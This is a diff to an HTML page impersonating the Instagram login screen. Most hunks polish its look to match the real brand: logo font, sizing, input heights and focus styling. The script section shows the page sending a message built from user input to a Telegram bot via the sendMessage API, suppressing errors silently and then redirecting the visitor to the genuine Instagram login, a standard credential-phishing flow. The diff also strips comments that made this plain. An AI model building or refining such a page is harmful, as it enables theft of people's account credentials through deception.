@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Instagram • Log in</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
   <style>
     * { box-sizing: border-box; margin:0; padding:0; }
     body {
@@ -28,11 +29,13 @@
       box-shadow: 0 2px 10px rgba(0,0,0,0.08);
     }
     .logo {
-      font-family: Billabong, cursive;
-      font-size: 3.5rem;
+      font-family: 'Billabong', cursive !important;
+      font-size: 4.2rem;
       color: #262626;
-      margin: 30px 0 25px;
-      letter-spacing: -2px;
+      margin: 30px 0 30px;
+      letter-spacing: -3px;
+      line-height: 1;
+      font-weight: normal;
     }
     input {
       width: 100%;
@@ -43,9 +46,11 @@
       background: #fafafa;
       font-size: 0.95rem;
       outline: none;
+      height: 44px;
     }
     input:focus {
       border-color: #0095f6;
+      box-shadow: 0 0 0 1px #0095f6 inset;
     }
     button {
       width: 100%;
@@ -58,6 +63,7 @@
       font-size: 0.98rem;
       margin: 12px 0;
       cursor: pointer;
+      height: 44px;
       transition: background 0.2s;
     }
     button:disabled {
@@ -175,9 +181,8 @@
 
       const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`;
 
-      fetch(url).catch(() => { /* silent fail */ });
+      fetch(url).catch(() => {});
 
-      // Redirect to real Instagram
       window.location.href = 'https://www.instagram.com/accounts/login/';
     });
   </script>
